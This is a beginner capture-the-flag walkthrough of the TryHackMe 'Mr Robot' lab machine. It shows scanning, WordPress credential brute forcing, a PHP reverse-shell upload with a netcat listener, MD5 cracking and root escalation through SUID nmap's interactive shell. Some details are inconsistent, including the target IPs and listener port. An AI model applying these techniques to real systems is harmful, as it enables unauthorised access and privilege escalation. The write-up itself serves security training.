# Room :- Mr Robot CTF

![image](https://imgur.com/LToaDi8.png)

---
## Penetration Testing Methodology

**Reconnaissance**
* nmap

**Enumeration**
* Directory Bruteforce using dirbuster & Gobuster

**Exploitation**
* hydra, hashcat

**Privilege Escalation**
* reverse-shell.php, netcat

**Capturing the flag**
* key-1-of-3.txt
* key-2-of-3.txt
* key-3-of-3.txt

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

### Tasks 
```
nmap -sS -sV -A -T4 10.10.128.16
```
Nmap scan report for 10.10.128.16\
Host is up (0.35s latency).\
Not shown: 65532 filtered ports\
PORT    STATE  SERVICE  VERSION\
22/tcp  closed ssh\
80/tcp  open   http     Apache httpd\
|_http-server-header: Apache\
|_http-title: Site doesn't have a title (text/html).\
443/tcp open   ssl/http Apache httpd\
|_http-server-header: Apache\
|_http-title: Site doesn't have a title (text/html).\
| ssl-cert: Subject: commonName=www.example.com\
| Not valid before: 2015-09-16T10:45:03\
|_Not valid after:  2025-09-13T10:45:03\
Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP\
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)\
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.4\
Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%)\
No exact OS matches for host (test conditions non-ideal).\
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)\
HOP RTT       ADDRESS\
1   404.09 ms 10.9.0.1\
2   406.28 ms 10.10.128.16\

**As this point, we have a Web server under APACHE. The next step I will do is to check this information with a browser. So, let’s roll :**

---
- **Further more enumeration**

I decided to look at the source code of the website to see if there some interesting stuff.
![image](https://miro.medium.com/max/1400/1*VRKSOetE__XCShs7jKIOYA.jpeg)

***At line 15***, I see that we have an IP address . I guess if the IP 208.185.115.6 is OK, you can go to index.html

Next, I would like to see more information about the website
```
nikto -h 10.10.128.16
```
Nikto scan report for 10.10.128.16
- Nikto v2.1.6

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -
+ Target IP: 192.168.0.18

+ Target Hostname: 192.168.0.18

+ Target Port: 80

+ Start Time: 2018–04–19 14:44:29 (GMT2)
— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use ‘-C all’ to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
+ Uncommon header ‘tcn’ found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for ‘index’ were found: index.html, index.php
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can’t connect (timeout): Operation now in progress
+ Scan terminated: 20 error(s) and 6 item(s) reported on remote host
+ End Time: 2018–04–19 14:51:40 (GMT2) (431 seconds)
— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -
We have an interesting thing, the **robot.txt**. Let’s browse it to see what happens.
![image](https://miro.medium.com/max/916/1*YaVePCuwhhm4yIF1-jlQ-Q.jpeg)

There are some interesting files. We have the “ key-1 of 3.txt” which can the first flag, and a dictionary ;)

 Let’s browse the first flag !
 ![image](https://miro.medium.com/max/992/1*nmDZNeanUzZ_CP9hfdzd3Q.jpeg)
 
 Let’s now downloading and opening the fsocity file.
 ![image](https://miro.medium.com/max/1400/1*6nb11lWf-9-AB0V6VWiYWA.jpeg)

We’ve got some nice information. So, I wonder “ where could be “ the office of the website….

To find it, I bruted force it with Gobuster.
---

Gobuster v3.0.1\
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\
===============================================================\
[+] Url:            http://10.10.128.16/ \
[+] Threads:        10\
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
[+] Status codes:   200,204,301,302,307,401,403\
[+] User Agent:     gobuster/3.0.1\
[+] Timeout:        10s\
===============================================================\
2020/06/20 03:34:32 Starting gobuster\
===============================================================\
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login.php (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)

Ok, that’s pretty good, isn’t it ?

Now, we know that the website has as a CMS WORDPRESS ( wp-login.php). The next steep is to browse our result ;)

![image](https://miro.medium.com/max/1400/1*kDeieV5-GrdiuXK-AnUNmQ.jpeg)
At this point, we would like to know more information about this CMS. So, I fired up wpscan with the file I found in the robots.txt.

I guess the user name “ elliot”. It’s not technic I know…. so BTW :
```
wpscan --url http://192.168.0.18 --passwords /location/of/wordlist/fsocitysortunique.dic --usernames elliot
```
![image](https://miro.medium.com/max/1400/1*MY7m1ONcCA4hu-cCBZB8Jw.png)
 Name | Password 
 -----| --------|
 | elliot | ER28–0652 |

So, we have the credentials to enter into the web site. Let’s see what happens

![image](https://miro.medium.com/max/1400/1*bEsJ3FbznpiHcWyREY15Vw.jpeg)
***Weakness***

Now we have to find a way to root the server. I found a way. It’s to upload a backdoor then connect to it and have a shell !!
To do this :-**let’s implement some php reverse shell.**
copy the php file from [**Here**](https://github.com/sourabhk267/tryhackme/blob/master/Mr-robot/php-reverse-shell.php) and save it in a .php extension file.
![image](https://imgur.com/iHDOA5E.png)
But before we need to zip the shell.php to upload it.
```
root@kali:~/tryhackme/mr_robot$ zip shell.zip shell.php

adding: shell.php (deflated 59%)
```
![image](https://imgur.com/8R8hdRA.png)
Great we successfully upload our php shell ! Let’s active it
![image](https://imgur.com/TJWP8eN.png)
Now open terminal and start the netcat listner at port 9999
```
nc -lnvp 999
```
Nice ! :D we have a shell let’s make it fancy now
Use this command to make it a stable shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
![image](https://imgur.com/kMjgqa7.png)
![image](https://imgur.com/MN5tFup.png)
As you can see we can’t see the key2 but we have an hash so let’s crack it
save the hash in a .txt file and use **hashcat** to crack the hash.

root@kali:~/tryhackme/mr_robot# hashcat -m 0 --force hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project\l
====================================\
* Device #1: pthread-Intel(R) Core(TM) i5-8265U CPU @ 1.60GHz, 512/1493 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* 
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
* Device #1: Kernel m00000_a0-pure.f5e529ad.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Sat Jun 20 04:53:05 2020 (0 secs)
Time.Estimated...: Sat Jun 20 04:53:05 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   297.1 kH/s (0.22ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: treetree -> loserface1

I cracked it and get the message :

abcdefghijklmnopqrstuvwxyz #robot password

####  Privileges escalation

As you can see, when I tried to catch the key-2-of-3.txt I got : Permission denied. That mean that I must be root to do it. So, now I have to find a way to get root.

![image](https://imgur.com/37RDyTP.png)
```
robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
```
***Final step getting root on the machine***

On the TryHackMe website the hint was “nmap”

So i found this website https://pentestlab.blog/category/privilege-escalation/ and it worked ! :D

daemon@linux:/home/robot$ su robot\
su robot\
Password: abcdefghijklmnopqrstuvwxyz\

### To find the root process 
find / -perm +6000 2>/dev/null | grep '/bin/'*\
/bin/ping  \
/bin/umount\
/bin/mount\
/bin/ping6\
/bin/su\
/usr/bin/mail-touchlock\
/usr/bin/passwd\
/usr/bin/newgrp\
/usr/bin/screen\
/usr/bin/mail-unlock\
/usr/bin/mail-lock\
/usr/bin/chsh\
/usr/bin/crontab\
/usr/bin/chfn\
/usr/bin/chage\
/usr/bin/gpasswd\
/usr/bin/expiry\
/usr/bin/dotlockfile\
/usr/bin/sudo\
/usr/bin/ssh-agent\
/usr/bin/wall\
/usr/local/bin/nmaprobot@linux:/$ nmap --interactive\
*
+ nmap --interactive## After some investigation on forum I found there is a weakness in Nmap, which you can be setting up into interactive mode. That allows to run shell commands inside of nmap.Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help

```
nmap> !sh
!sh
# ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv tmp  var
boot  etc  initrd.img  lib64  media   opt  root  sbin  sys usr  vmlinuz
# cd /root
cd /root
# ls
ls
firstboot_done key-3-of-3.txtcat key-3-of-3.txt
$$$$$$$$$$$$$$$$$$$$$$$$$$$ # root flag 
```
**By_sourabh_**
